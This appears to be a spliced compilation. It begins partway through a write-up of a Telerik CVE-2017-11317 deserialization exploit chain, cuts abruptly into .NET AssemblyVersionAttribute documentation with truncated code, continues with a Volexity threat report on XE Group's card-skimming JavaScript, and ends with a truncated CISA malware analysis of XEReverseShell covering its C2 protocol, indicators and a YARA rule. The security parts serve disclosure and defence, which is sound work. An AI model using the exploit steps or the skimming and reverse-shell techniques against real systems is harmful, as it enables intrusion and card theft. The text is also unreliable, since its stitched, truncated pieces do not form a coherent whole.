 Type type = Type.GetType(CryptoService.GetService().Decrypt(array[1]));
 IAsyncUploadConfiguration asyncUploadConfiguration = (IAsyncUploadConfiguration)SerializationService.Deserialize(obj, type, true);
 if (!this.IsValidHMac(asyncUploadConfiguration.TargetFolder) || !this.IsValidHMac(asyncUploadConfiguration.TempTargetFolder))
 {
  throw new CryptographicException("The hash is not valid!");
 }
 asyncUploadConfiguration.TargetFolder = AsyncUploadHandler.DecryptFolder(this.GetEncryptedText(asyncUploadConfiguration.TargetFolder));

Here a *JavaScriptSerializer* gets parameterized with the type provided in the *rauPostData*. That means this is an arbitrary *JavaScriptSerializer* deserialization!

From the research [*Friday the 13th JSON Attacks* by Alvaro Muñoz & Oleksandr Mirosh](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf) it is known that arbitrary *JavaScriptSerializer* deserialization can be harmful if the expected type can be specified by the attacker. During deserialization, appropriate setter methods get called. A suitable gadget is the *System.Configuration.Install.AssemblyInstaller*, which allows the loading of a DLL by specifying its path. If the DLL is a mixed mode assembly, its `DllMain()` entry point gets called on load, which allows the execution of arbitrary code in the context of the *w3wp.exe* process.

This allowed the remote code execution on Managed Workplace without authentication. The issue has been addressed and should be fixed in [Managed Workplace 11 SP4 MR2](http://forum.avgbusiness.managedworkplace.com/announcement/38-announcing-managed-workplace-11-sp4-mr2/).

## Conclusion

So CVE-2017-11317 can be exploited even without the requirement of being able to write to the web document root:

1. Upload a mixed mode assembly DLL to a writable location using the regular *AsyncUploadConfiguration* exploit.
2. Load the uploaded DLL and thereby trigger its `DllMain()` function using the *AssemblyInstaller* exploit described above.

This is an excellent example that revisiting old vulnerabilities can be worthwhile and result in new ways out of a supposed dead end.

## Examples

The following example uses the [AssemblyVersionAttribute](system.reflection.assemblyversionattribute?view=net-9.0) attribute to assign a version number to an assembly. At compile time, this version information is stored with the assembly's metadata. At run time, the example retrieves the value of the [Type.Assembly](system.type.assembly?view=net-9.0#system-type-assembly) property on a type found in the assembly to get a reference to the executing assembly, and it retrieves the assembly's version information from the [Version](system.reflection.assemblyname.version?view=net-9.0#system-reflection-assemblyname-version) property of the [AssemblyName](system.reflection.assemblyname?view=net-9.0) object returned by the [Assembly.GetName](system.reflection.assembly.getname?view=net-9.0) method.

```
using System;
using System.Reflection;

[assembly:AssemblyVersionAttribute("2.0.1")]

public class Example1
{
   public static void Main()
   {
      Assembly thisAssem = typeof(Example1).Assembly;
      AssemblyName thisAssemName = thisAssem.GetName();

      Version ver = thisAssemName.Version;

      Console.WriteLine("This is version {0} of {1}.", ver, thisAssemName.Name);
   }
}
// The example displays the following output:
//        This is version 2.0.1.0 of Example1.

```
```
open System.Reflection

type Example1 = class end

let thisAssem = typeof<Example1>.Assembly
let thisAssemName = thisAssem.GetName()

let ver = thisAssemName.Version

printfn $"This is version {ver} of {thisAssemName.Name}."
// The example displays the following output:
//        This is version 2.0.1.0 of Example1.

```
```
Imports System.Reflection

   Public Sub Main()
       Dim thisAssem As Assembly = GetType(Example1).Assembly
       Dim thisAssemName As AssemblyName = thisAssem.GetName()

       Dim ver As Version = thisAssemName.Version

       Console.WriteLine("This is version {0} of {1}.", ver, thisAssemName.Name)

## XE Group – Exposed: 8 Years of Hacking & Card Skimming for Profit

December 7, 2021

In 2020 and 2021, Volexity identified multiple compromises related to a relatively unknown criminal threat actor that refers to itself as "XE Group". Volexity believes that XE Group is likely a Vietnamese-origin criminal threat actor whose intrusions follow an approximate pattern:

* Compromise of externally facing services via known exploits (e.g., Telerik UI vulnerabilities)
* Monetization of these compromises through installation of password theft or credit card skimming code for web services related to these servers

There has been previously reported XE Group activity in a blog  [by Malwarebytes](https://blog.malwarebytes.com/threat-analysis/2020/07/credit-card-skimmer-targets-asp-net-sites/) from 2020; this post serves to provide additional  insight into XE Group and an update on its current operations.

## Analysis

Volexity first encountered XE Group activity in early 2020 following a web server compromise at a customer site. The breach of the web server was automated, and it was remediated quickly after discovery, with no notable actions taken by the attacker. That one incident was a small blip on the radar and appeared rather isolated. Recently, however, Volexity detected XE Group activity across several of its customers by way of Volexity's Network Security Monitoring service. This time, the activity was coming from client systems rather than web servers. A deeper dive into the activity revealed clients were visiting compromised websites and potentially falling victim to a widespread credit card skimming operation.

After finding this new XE Group activity, Volexity investigated and quickly found infrastructure used by the attacker. In many cases, it was not difficult to enumerate the attackers' infrastructure using basic pivots such as WHOIS registrants and passive DNS. Much of this infrastructure still tied back to items described in the aforementioned Malwarebytes blog. The attacker uses email addresses relating to “xe[word]” and has consistently used the same custom nameservers (ns1.xegroups[.]com and ns2.xegroups[.]com) with their domains for a number of years.

An overview of the infrastructure used in the last three years is given in Figure 1 below. A full list can be found on Github [here](https://github.com/volexity/threat-intel/blob/main/2021/2021-12-06%20-%20XEGroup/indicators/indicators.csv).

![](https://www.volexity.com/wp-content/uploads/2021/11/maltego_replacement_image.jpg)

*Figure 1. XE Group infrastructure can be closely linked via passive DNS, WHOIS data, and other patterns*

In the Figure 1, each red dot is a malware sample. A large number of the samples belong to a group of malware families that the attacker refers to collectively as “XEReverseShell”. Despite the singular name, in practice several of these offer different functionality. The malware families are mostly written in .NET and AutoIT, although the attacker sometimes uses loaders for their malware family written in C++.

Sometimes, the attacker even labels [their malware](https://www.virustotal.com/gui/file/42b71d9548a8dfac0e4b3fd3946329972bdc0e156402ca47e6bb1cd58ab9f77c/details) as belonging to XE Group, as shown below:

![](https://www.volexity.com/wp-content/uploads/2021/11/image003-1024x99.png)

*Figure 2. Sometimes the malware authors label malware with their brand.*

Despite this, the bread and butter of attacks from XE Group is credit card skimming, and the other tools Volexity has identified are only used to help facilitate this purpose.

## Credit Card Skimming

The most recent credit card skimming activity identified by Volexity was found based on suspicious redirects to the domain “object[.]fm”, a domain using the xegroups[.]com nameserver.  The code used to load the malicious JavaScript from this page reveals that the attacker uses an interesting technique: the JavaScript keyword "object" is used to populate the domain value:

![](https://www.volexity.com/wp-content/uploads/2021/11/image005.png)

*Figure 3. Example code added to compromised sites to load malicious JavaScript*

The effect of this code is to append a script to the loading page where the "src" value is as follows:

> typeof({}).fm/gmt.js

Since typeof({}) evaluates to "object", this becomes:

> object[.]fm/gmt.js

Volexity searched for other websites containing similar scripts to load additional JavaScript and found that the attacker is using the same method to load scripts from the domain "**object.sbs**".

The [gmt.js file](https://www.virustotal.com/gui/file/348e8494d32e6f7e8dcbe1f295ca9efd2af047d92d73eaf0091cd20efe48eb79) loaded on infected sites is used for credit card skimming and shares much of the same code as the [original skimmer](https://github.com/MBThreatIntel/skimmers/blob/master/null_gif_skimmer.js) identified by Malwarebytes. The effect of the credit card skimmer is that any form data submitted to pages loading the JavaScript in question is also exfiltrated to an attacker URL. An example of the type of form data stolen is shown below:

> {"rcgnAdultsCheckBoxon”:””,”firstNameTextBox”:”[name]”:,”lastNameTextBox”:”[surname]”:,”birthdateTextBox”:”[date]”,”genderCodeDropDown”:”[gender]”,”emailAddressTextBox”:”[email\_address]”,”relationshipDropDown”:”[relation]”,”txtCardNumber”:”1111-2222-3333-4444:”,”ddlExpirationMonth”:”[month]”,”ddlExpirationYear:”[year],”txtSecurityCode”:”[code]"}

The new version of the credit card skimming code shows slight differences to the 2020 version:

* There is additional use of “.join()” and .”replace()” to rebuild obfuscated strings.
* Since the attacker is using "object" for their subdomains, they use another trick to obfuscate the domain name in the script itself:

> k = typeof {}
>
> r = location.toString().replace(/^(.\*?\:\/\/).\*?(\.).\*$/g, '$1' + k+'$2')

Here, "k" is a JavaScript Object; "r" takes the current location (e.g., the current URL) as a string and replaces the entire location with the contents of "k" (i.e., "object").

* The URI used to send stolen data to is pseudo randomized using arrays of words and random integers.
* Functionality to look for passwords has been removed in the cases Volexity has identified.
* Additional checks are done within the script to make sure the window has finished loading before key functionality is run by the script. This avoids a race condition between scripts on the infected page and the malicious JavaScript.
* In older versions of the credit card skimmer, exfiltrated data was encoded in plain hex in the URL. In newer versions, colons and tilde characters are used to denote key value pairs and end of field markers respectively. A script to decode an exfiltration URL is provided on GitHub [here](https://github.com/volexity/threat-intel/blob/main/2021/2021-12-06%20-%20XEGroup/scripts/decode_uri.py).

Additionally, in some cases the attacker appears to find the results of their standard credit card skimmer are insufficient or hard to parse, so they have included additional code to skim specific fields from compromised sites, [an example of which is given below](https://www.virustotal.com/gui/file/f2642c6179a06c3a98d9e5499ebc14c249e34e61fb88d065b0125ca1ad7290d5/details):

*Figure 4. Additional skimming code included on one compromised page to scrape specific fields*

## Affected Websites

After identifying a number of attacker command-and-control (C2) servers, Volexity searched various data sources—including its own telemetry—in order to discover websites that are compromised and hosting the credit card skimmer described above. Compromised sites vary a great deal in popularity and nature; examples of compromised sites include the following industries/sectors:

* Travel
* Restaurant
* Art & Culture
* Non-profit

The variety of affected sites suggests no clear strategy on the attacker's part, and therefore suggests it may be a case of attempted bulk exploitation and indiscriminate attacks.

In one case, however, the attacker appears to have been able to compromise a web design company that specializes in designing and maintaining websites for storefronts. This means that each site owned by that company is currently serving a credit card skimmer.

## Who Is XE Group?

Volexity believes XE Group is likely a Vietnamese-origin threat actor; several things led to this conclusion. First, the WHOIS information for several of the malicious domains is for an individual located in Vietnam:

![](https://www.volexity.com/wp-content/uploads/2021/11/image009-1024x169.png)

*Figure 5. Screenshot from DomainTools Iris showing WHOIS information for “xemembers.com”*

While this information is often faked, there is indeed [a user with the name](https://github.com/xethanh) “Joe Nguyen”, username "xethanh", with an empty repository “xegroupdev” present on GitHub.

![](https://www.volexity.com/wp-content/uploads/2021/11/image011-1024x505.png)

*Figure 6. GitHub profile of "Joe Nguyen" / "xethanh" which are terms seen in WHOIS records for known C2 addresses*

This is a largely unused GitHub profile using a custom "XE" avatar and referencing both "Joe Nguyen" (the same name seen in the previously mentioned WHOIS records) and "xegroupdev".

A user with username “xethanh” previously existed on the now-abandoned forum crdclub[.]su which advertised stolen credit card information:

![](https://www.volexity.com/wp-content/uploads/2021/11/image013-1024x42.png)

*Figure 7. Post on crdclub[.]su shows a user with the same handle seen on Github ("xethanh") advertising stolen credit card data*

Users with the same name exist on other carding forums as well, such as cybercarders[.]su and cardingforum[.]co. In a non-malware twist, there is also a YouTube profile with the handle "xethanh" which uses the same name and XE avatar as the Github profile.

![](https://www.volexity.com/wp-content/uploads/2021/11/image015_cropped.png)

*Figure 8. YouTube profile for user "xethanh" with the same avatar and username as the previously mentioned Github profile*

Crucially, in the About section of the YouTube profile, there is a link to xegroups[.]com/xethanh. The site xegroups[.]com is a C2 for older malware samples and a nameserver for newer infrastructure used by the group. While the name "Joe Nguyen" may be a pseudonym, it seems most likely that the user behind the GitHub and YouTube accounts is the attacker.

It could be that XE Groups is a compromised organization of some kind, but this seems unlikely since a number of the tools used by the attacker over a long period of time has used "xe[word]" nomenclature in descriptions, original filenames, and PDB strings. Furthermore, a number of the malware files discovered in VirusTotal were first observed being uploaded from Vietnamese web users, many of whom only have a single VirusTotal upload. It is likely these were uploaded by the attacker in order to test detection rates of their malware prior to deploying them in real environments.

## Conclusion

XE Group's credit card skimming operation has been ongoing since at least early 2020, using a relatively limited set of infrastructure. The attacker primarily focuses on compromising IIS environments and uses their access to deploy credit card skimming JavaScript code on affected websites.

There is a relatively clear trail of evidence to help identify XE Group. The attacker appears to be of Vietnamese origin. They often use the brand “XE Group”, and a number of "xe[word]" themed domains have been registered and linked to the group. Volexity has identified a likely persona on carding forums associated with this activity, which suggests the attacker monetizes stolen credit card data through sales rather than direct use of stolen cards themselves. The persona used for the GitHub and carding account, and several of the domains, have a history going back to 2013, which suggests the attacker may have been attempting similar attacks for up to eight years, with only one significant public mention of their activity. The oldest malware sample Volexity was able to identify [relating to XE Group dates back to late 2014](https://www.virustotal.com/gui/file/02c48917b15015ddd02738bc1f480f9c6379165618435855030f4c63ce372485).

To prevent these specific attacks from being successful, Volexity recommends the following:

* Block related network indicators provided ([link](https://github.com/volexity/threat-intel/blob/main/2021/2021-12-06%20-%20XEGroup/indicators/indicators.csv)).
* Use signatures provided ([link](https://github.com/volexity/threat-intel/blob/main/2021/2021-12-06%20-%20XEGroup/indicators/yara.yar)) to identify related activity.

Analysis Report
# MAR-10413062-1.v1 Telerik Vulnerability in U.S. Government IIS Server

Release DateMarch 15, 2023
Alert CodeAR23-074A

| Notification This report is provided "as is" for informational purposes only. The Department of Homeland Security (DHS) does not provide any warranties of any kind regarding any information contained herein. The DHS does not endorse any commercial product or service referenced in this bulletin or otherwise.  This document is marked TLP:CLEAR--Disclosure is not limited.

Subject to standard copyright rules, TLP:CLEAR information may be distributed without restriction. For more information on the Traffic Light Protocol (TLP), see [http://www.cisa.gov/tlp](https://urldefense.com/v3/__http%3A//www.cisa.gov/tlp__;!!JNdenfMLDA!eLdVDi0dk3cK4q20Pbwd_vZJeBvnhG6Qbj0aB2C2oofRBP68A-MCjUGwY9TZK_d2gkCiFi4hy-TXHEglzmmmeJ7Uanfh35aWvw%24). SummaryDescription CISA received 18 files for analysis from a forensic analysis engagement conducted at a Federal Civilian Executive Branch (FCEB) agency.  When 11 of the dynamic link library (DLL) files are loaded, the files can read, create, and delete files. If the DLL contains a hardcoded Internet Protocol (IP) address, status messages will be sent to the IP. One DLL file will attempt to collect the target system's Transmission Control Protocol (TCP) connection table, and exfiltrate it to a remote Command and Control server (C2). Five of the files drop and decode a reverse shell utility that can send and receive data and commands. In addition, the files drop and decode an Active Server Pages (ASPX) webshell.

If there was an error while calling ReadFile, “read file failed” will be sent to the IP. 45[.]77[.]212[.]12Tags command-and-control Ports  * 443 TCP  Whois NetRange:     45[.]76[.]0[.]0 - 45[.]77[.]255[.]255 CIDR:         45[.]76[.]0[.]0/15 NetName:        CONSTANT NetHandle:     NET-45-76-0-0-1 Parent:         NET45 (NET-45-0-0-0-0) NetType:        Direct Allocation OriginAS:     AS20473 Organization: The Constant Company, LLC (CHOOP-1) RegDate:        2015-04-24 Updated:        2022-09-20 Comment:        Geofeed hxxps://geofeed[.]constant[.]com/ Ref:            hxxps://rdap[.]arin[.]net/registry/ip/45[.]76[.]0[.]0    OrgName:        The Constant Company, LLC OrgId:         CHOOP-1 Address:        319 Clematis St. Suite 900 City:         West Palm Beach StateProv:     FL PostalCode:     33401 Country:        US RegDate:        2006-10-03 Updated:        2021-03-30 Comment:        hxxp://www[.]constant[.]com/ Ref:            hxxps://rdap[.]arin[.]net/registry/entity/choop-1   OrgNOCHandle: NETWO1159-ARIN OrgNOCName: Network Operations OrgNOCPhone: +1-973-849-0500 OrgNOCEmail: network[@]constant[.]com OrgNOCRef:    hxxps://rdap[.]arin[.]net/registry/entity/netwo1159-arin  OrgAbuseHandle: ABUSE1143-ARIN OrgAbuseName: Abuse Department OrgAbusePhone: +1-973-849-0500 OrgAbuseEmail: abuse[@]constant[.]com OrgAbuseRef:    hxxps://rdap[.]arin[.]net/registry/entity/abuse1143-arin  OrgTechHandle: NETWO1159-ARIN OrgTechName: Network Operations OrgTechPhone: +1-973-849-0500 OrgTechEmail: network[@]constant[.]com OrgTechRef:    hxxps://rdap[.]arin[.]net/registry/entity/netwo1159-arin   NetRange:     45[.]77[.]212[.]0 - 45[.]77[.]213[.]255 CIDR:         45[.]77[.]212[.]0/23 NetName:        NET-45-77-212-0-23 NetHandle:     NET-45-77-212-0-1 Parent:         CONSTANT (NET-45-76-0-0-1) NetType:        Reassigned OriginAS:     Organization: Vultr Holdings, LLC (VHL-59) RegDate:        2017-11-21 Updated:        2017-11-21 Ref:            hxxps://rdap[.]arin[.]net/registry/ip/45[.]77[.]212[.]0   OrgName:        Vultr Holdings, LLC OrgId:         VHL-59 Address:        2001 6th Avenue, Suite 300 Address:        2001 Sixth LLC City:         Seattle StateProv:     WA PostalCode:     98121 Country:        US RegDate:        2015-03-05 Updated:        2015-03-05 Ref:            hxxps://rdap[.]arin[.]net/registry/entity/vhl-59   OrgAbuseHandle: VULTR-ARIN OrgAbuseName: Vultr Abuse OrgAbusePhone: +1-973-849-0500 OrgAbuseEmail: abuse[@]vultr[.]com OrgAbuseRef:    hxxps://rdap[.]arin[.]net/registry/entity/vultr-arin  OrgTechHandle: VULTR-ARIN OrgTechName: Vultr Abuse OrgTechPhone: +1-973-849-0500 OrgTechEmail: abuse[@]vultr[.]com OrgTechRef:    hxxps://rdap[.]arin[.]net/registry/entity/vultr-arin Relationships  | 45[.]77[.]212[.]12 | Connected\_From | e044bce06ea49d1eed5e1ec59327316481b8339c3b6e1aecfbb516f56d66e913 | | --- | --- | --- | | 45[.]77[.]212[.]12 | Connected\_From | d69ac887ecc2b714b7f5e59e95a4e8ed2466bed753c4ac328931212c46050b35 | | 45[.]77[.]212[.]12 | Connected\_From | 853e8388c9a72a7a54129151884da46075d45a5bcd19c37a7857e268137935aa | | 45[.]77[.]212[.]12 | Connected\_From | a14e2209136dad4f824c6f5986ec5d73d9cc7c86006fd2ceabe34de801062f6b |  Description This IP was utilized by multiple malicious applications in this report as a C2 server.

When this utility is executed it will attempt to connect to the domain xework[.]com to obtain the IP address of the C2 and port number to listen on. If no IP address or port number is obtained the program will terminate.  ---Begin HTTP Sessions--- GET /masterip HTTP/1[.]1 Host: xework[.]com Connection: Keep-Alive  GET /masterport HTTP/1[.]1 Host: xework[.]com ---End HTTP Sessions---  Upon receipt of the port number, XEReverseShell[.]exe will establish a listener on the port to accept streamed data. The utility is able to read or write streamed data and pass incoming commands to a command shell. The program will check the OS Version of the system to determine what type of command shell is required. For Windows systems it will invoke Y21kLmV4ZQ== (cmd[.]exe), and for Linux it will invoke L2Jpbi9iYXNo (/bin/bash).  XEReverseShell collects the path to the web server system files, current username, APP\_POOL (IIS Application Pool configuration), ComputerName, OSVersion, Internet IP, Local IP and Reverse Domain. If it cannot identify the Internet IP address or Reverse Domain the utility attempts to connect to api[.]hackertarget[.]com/reverselookup/?q= to identify the IP address or retrieve answer records for the domain. Api[.]hackertarget[.]com is a legitimate website hosted for blue teams and penetration testers.  XEReverseShell will send the system data to the C2 in the following format:  ---Begin--- WEBSITE PATH  ------------------------[ XE ReverseShell ]----------------------- CURRENT USERNAME APP POOL COMPUTER NAME SYSTEM INTERNET IP        LOCAL IP REVERSE DOMAIN ---End---  The utility will expect the command ‘xesetshell’ from the C2. If the command is received it will connect to the C2 and download a file called small[.]txt (5cbba90ba5...). Small[.]txt is a base64 encoded webshell that the program decodes as small[.]aspx and places in the path C:\Windows\Temp. If the utility receives the command ‘xequit’ it will sleep for a period of time determined by the adversary. xework[.]comTags command-and-control Ports  * 80 TCP  HTTP Sessions  * GET /masterip HTTP/1[.]1   Host: xework[.]com   Connection: Keep-Alive * GET /masterport HTTP/1[.]1   Host: xework[.]com  Whois Domain Name: XEWORK[.]COM Registry Domain ID: 1568779295\_DOMAIN\_COM-VRSN Registrar WHOIS Server: whois[.]godaddy[.]com Registrar URL: hxxp://www[.]godaddy[.]com Updated Date: 2022-09-06T10:32:23Z Creation Date: 2009-09-11T22:17:25Z Registry Expiry Date: 2026-09-11T22:17:25Z Registrar: GoDaddy[.]com, LLC Registrar IANA ID: 146 Registrar Abuse Contact Email: abuse[@]godaddy[.]com Registrar Abuse Contact Phone: 480-624-2505 Domain Status: ok hxxps://icann[.]org/epp#ok Name Server: NS05[.]DOMAINCONTROL[.]COM Name Server: NS06[.]DOMAINCONTROL[.]COM DNSSEC: unsigned  Domain Name: XEWORK[.]COM Registry Domain ID: 1568779295\_DOMAIN\_COM-VRSN Registrar WHOIS Server: whois[.]godaddy[.]com Registrar URL: hxxps://www[.]godaddy[.]com Updated Date: 2018-03-05T23:44:55Z Creation Date: 2009-09-11T17:17:25Z Registrar Registration Expiration Date: 2026-09-11T17:17:25Z Registrar: GoDaddy[.]com, LLC Registrar IANA ID: 146 Registrar Abuse Contact Email: abuse[@]godaddy[.]com Registrar Abuse Contact Phone: +1[.]4806242505 Domain Status: ok hxxps://icann[.]org/epp#ok Registry Registrant ID: Not Available From Registry Registrant Name: Registration Private Registrant Organization: Domains By Proxy, LLC Registrant Street: DomainsByProxy[.]com Registrant Street: 2155 E Warner Rd Registrant City: Tempe Registrant State/Province: Arizona Registrant Postal Code: 85284 Registrant Country: US Registrant Phone: +1[.]4806242599 Registrant Phone Ext: Registrant Fax: +1[.]4806242598 Registrant Fax Ext: Registrant Email: Select Contact Domain Holder link at hxxps://www[.]godaddy[.]com/whois/results.aspx?domain=xework.com Registry Admin ID: Not Available From Registry Admin Name: Registration Private Admin Organization: Domains By Proxy, LLC Admin Street: DomainsByProxy[.]com Admin Street: 2155 E Warner Rd Admin City: Tempe Admin State/Province: Arizona Admin Postal Code: 85284 Admin Country: US Admin Phone: +1[.]4806242599 Admin Phone Ext: Admin Fax: +1[.]4806242598 Admin Fax Ext: Admin Email: Select Contact Domain Holder link at hxxps://www[.]godaddy[.]com/whois/results.aspx?domain=xework.com Registry Tech ID: Not Available From Registry Tech Name: Registration Private Tech Organization: Domains By Proxy, LLC Tech Street: DomainsByProxy[.]com Tech Street: 2155 E Warner Rd Tech City: Tempe Tech State/Province: Arizona Tech Postal Code: 85284 Tech Country: US Tech Phone: +1[.]4806242599 Tech Phone Ext: Tech Fax: +1[.]4806242598 Tech Fax Ext: Tech Email: Select Contact Domain Holder link at hxxps://www[.]godaddy[.]com/whois/results.aspx?domain=xework.com Name Server: NS05[.]DOMAINCONTROL[.]COM Name Server: NS06[.]DOMAINCONTROL[.]COM DNSSEC: unsigned Relationships  | xework[.]com | Connected\_From | 11d8b9be14097614dedd68839c85e3e8feec08cdab675a5e89c5b055a6a68bad | | --- | --- | --- | | xework[.]com | Connected\_From | a0ab222673d35d750a0290db1b0ce890b9d40c2ab67bfebb62e1a006e9f2479c | | xework[.]com | Resolved\_To | 184[.]168[.]104[.]171 | | xework[.]com | Resolved\_To | 144[.]96[.]103[.]245 |  Description At the time of analysis, the files "XEReverseShell[.]exe" (11d8b9be14...) and "Multi-OS\_ReverseShell[.]exe" (a0ab222673...) attempted to connect to this domain. 184[.]168[.]104[.]171Relationships  | 184[.]168[.]104[.]171 | Resolved\_To | xegroups[.]com | | --- | --- | --- | | 184[.]168[.]104[.]171 | Resolved\_To | hivnd[.]com | | 184[.]168[.]104[.]171 | Resolved\_To | xework[.]com |  Description At the time of analysis, the domains xework[.]com, xegroups[.]com, and hivnd[.]com resolved to this IP address. 144[.]96[.]103[.]245Relationships  | 144[.]96[.]103[.]245 | Resolved\_To | xework[.]com | | --- | --- | --- |  Description The domain xework[.]com returned this IP address as the masterip for the reverse shell. 5cbba90ba539d4eb6097169b0e9acf40b8c4740a01ddb70c67a8fb1fc3524570Tags downloaderuploaderwebshell Details  | Name | small.txt | | --- | --- | | Size | 8900 bytes | | Type | ASCII text, with very long lines, with no line terminators | | MD5 | d75ab9cb786b6f125e4cdbc92a73fa21 | | SHA1 | d5cdda25247c3e6f1fd099077fae156ed7bada4f | | SHA256 | 5cbba90ba539d4eb6097169b0e9acf40b8c4740a01ddb70c67a8fb1fc3524570 | | SHA512 | b49caa7b6fdbeba5ba8e615e9297bd52e89e2eb9af220a63064fe3479c8ffcafe21f6f446a8acb23073478284bfb8b963e223ff76baa4c1dd95e15f364579ae2 | | ssdeep | 192:xNXm9xavX5N7R9e9WO7tAp1qTzUUCDhI5L6WrG/ht:x1my/5N7R9eO1qTwUei5baJt | | Entropy | 5.730812 | | Path | C:\Windows\Temp |  Antivirus No matches found.

When the utility is executed it will attempt to connect to the domain xegroups[.]com using Secure Sockets Layer (SSL) to obtain the IP address of the C2 and port number to listen on. If no IP address or port number is obtained the program will terminate.  Upon receipt of the port number, Multi-OS ReverseShell will establish a listener on the port to accept streamed data. If a port number is not returned, the program will listen on TCP 3979 by default. The utility is able to read or write streamed data and pass incoming commands to a command shell. The program will check the OS Version of the system to determine what type of command shell is required.

Multi-OS ReverseShell collects the path to the web server system files, current username, APP\_POOL (IIS Application Pool configuration), ComputerName, OSVersion, Internet IP, Local IP and Reverse Domain XEReverseShell will send the system data to the C2 in the following format:  ---Begin--- ---[ X ReverseShell ]--- CURRENT USERNAME APP POOL            APP\_POOL\_CONFIG COMPUTER NAME SYSTEM                LOCAL IP ----------------------------- ---End---  After the listener is set, the utility will execute the ‘setshell’ command that drops an embedded ASPX webshell (08375e2d18...). If the utility receives the command ‘xequit’ it will sleep for a period of time determined by the adversary. e45ad91f12188a7c3d4891b70e1ee87a3f23eb981804ea72cd23f1d5e331ff5aTags decryptordroppertrojan Details  | Name | 1596835329.5015914.png | | --- | --- | | Size | 165888 bytes | | Type | PE32+ executable (DLL) (GUI) x86-64 Mono/.Net assembly, for MS Windows | | MD5 | 137423d7b7f5a5684a9b1457f46fdfb2 | | SHA1 | 679a6b4b7fa0978e38b327e318059c26b883b064 | | SHA256 | e45ad91f12188a7c3d4891b70e1ee87a3f23eb981804ea72cd23f1d5e331ff5a | | SHA512 | d56ed37959b6ea37d0f2e58d6f1f61b7b85fa593d1228a402c9798c945e52432008c7a897a6b8e40bfd33fae22df34db93ce46a83f728675e109d828bc1cb995 | | ssdeep | 3072:orofuzXob2OYWWibJXDYipzo2UVX+pnn/quS/eSzYU:FfuzXZOY3aSinn/quS/eSz | | Entropy | 6.244787 |  Antivirus  | Bitdefender | Gen:Variant.Tedy.146424 | | --- | --- | | Emsisoft | Gen:Variant.Tedy.146424 (B) | | ESET | a variant of Win64/Agent.AQS trojan | | K7 | Trojan ( 0058b2b81 ) | | McAfee | RDN/Generic Exploit | | Zillya! | Trojan.Agent.Win64.22713 |  YARA Rules  * rule CISA\_10413062\_10 : XEReverseShell trojan backdoor downloader dropper webshell remote\_access communicates\_with\_C2 exfiltrates\_data installs\_other\_components   {      meta:          Author = "CISA Code & Media Analysis"          Incident = "10413062"          Date = "2022-11-23"          Last\_Modified = "20221215\_1930"          Actor = "n/a"          Family = "XEReverseShell"          Capabilities = "remote-access communicates-with-C2 exfiltrates-data installs-other-components"          Malware\_Type = "trojan backdoor downloader dropper webshell"          Tool\_Type = "remote-access"          Description = "Detects XEReverseShell samples"          MD5\_1 = "37e173b932596af62fefc4dc10c8551d"          SHA256\_1 = "815d262d38a26d5695606d03d5a1a49b9c00915ead1d8a2c04eb47846100e93f"          MD5\_2 = "0bcceb4fdfb12db21fdfc3a42b9c4693"          SHA256\_2 = "508dd87110cb5bf5d156a13c2430c215035db216f20f546e4acec476e8d55370"          MD5\_3 = "42d7b2e1bcf75f9c469afa340f078c86"          SHA256\_3 = "d9273a16f979adee1afb6e55697d3b7ab42fd75051786f8c67a6baf46c4c19c2"          MD5\_4 = "d85880ad1e87c4266f899eca02207dd4"          SHA256\_4 = "1fed0766f564dc05a119bc7fa0b6670f0da23504e23ece94a5ae27787b674cd2"          MD5\_5 = "eaa579d911b8a47eaaea744d59d14708"          SHA256\_5 = "11d8b9be14097614dedd68839c85e3e8feec08cdab675a5e89c5b055a6a68bad"          MD5\_6 = "f968639a4840535a6ecda1cbe3065260"          SHA256\_6 = "a0ab222673d35d750a0290db1b0ce890b9d40c2ab67bfebb62e1a006e9f2479c"          MD5\_7 = "137423d7b7f5a5684a9b1457f46fdfb2"          SHA256\_7 = "e45ad91f12188a7c3d4891b70e1ee87a3f23eb981804ea72cd23f1d5e331ff5a"          MD5\_8 = "7947ce86923d732e6963c79aea757036"          SHA256\_8 = "8a5fc2b8ecb7ac6c0db76049d7e09470dbc24f1a90026a431285244818866505"          MD5\_9 = "d3cf1d590b2a63ae6070dd0011390f03"          SHA256\_9 = "78a926f899320ee6f05ab96f17622fb68e674296689e8649c95f95dade91e933"              strings:          $s1 = { 50 67 42 59 52 56 4a 6c 64 6d 56 79 63 32 56 54 61 47 56 73 }          $s2 = { 54 56 71 51 41 41 4d 41 41 41 41 45 41 41 41 }          $s3 = { 78 65 73 76 72 73 2e 65 78 65 }          $s4 = { 58 45 52 65 76 65 72 73 65 53 68 65 6c 6c }          $s5 = { 57 45 56 53 5a 58 5a 6c 63 6e 4e 6c 55 32 }          $s6 = { 59 00 32 00 31 00 6b 00 4c 00 6d 00 56 00 34 00 5a 00 51 00 3d 00 3d }      condition:          2 of them   }  ssdeep Matches No matches found.

The program will check the OS Version of the system to determine what type of command shell is required. For Windows systems it will invoke Y21kLmV4ZQ== (cmd[.]exe), and for Linux it will invoke L2Jpbi9iYXNo (/bin/bash).  XEReverseShell collects the path to the web server system files, current username, APP\_POOL (IIS Application Pool configuration), ComputerName, OSVersion, Internet IP, Local IP and Reverse Domain. If it cannot identify the Internet IP address or Reverse Domain the utility attempts to connect to api[.]hackertarget[.]com/reverselookup/?q= to identify the IP address or retrieve answer records for the domain. Api[.]hackertarget[.]com is a legitimate website hosted for blue teams and penetration testers.  XEReverseShell will send the system data to the C2 in the following format: ---Begin--- |  ------------------------[ XE ReverseShell ]----------------------- CURRENT USERNAME APP POOL        APP\_POOL\_CONFIG COMPUTER NAME SYSTEM INTERNET IP        LOCAL IP REVERSE DOMAIN  ------------------------------------------------------------------------- ---End---  After the listener is set, the program will drop and decode an embedded base64 encoded webshell named small[.]aspx (08375e2d18...) into the path C:\Windows\Temp. If the utility receives the command ‘xequit’ it will sleep for a period of time determined by the adversary. 11415ac829c17bd8a9c4cef12c3fbc23095cbb3113c89405e489ead5138384cdTags downloadertrojan Details  | Name | 1597974061.4531896.png | | --- | --- | | Size | 92160 bytes | | Type | PE32+ executable (DLL) (GUI) x86-64 Mono/.Net assembly, for MS Windows | | MD5 | bf6722f2055b13a61dfb7233af8d966a | | SHA1 | 161435d198f3dba6ac1ce045b73ccd61f7697146 | | SHA256 | 11415ac829c17bd8a9c4cef12c3fbc23095cbb3113c89405e489ead5138384cd | | SHA512 | dc5dda0aab59c95af5d01b8491b428eee21a62fe1381d85a6faa0caf5d0a3022bcc02777d88b59cda304d57cac1308fdd6676d8040b618e76f28e05d1903c8ad | | 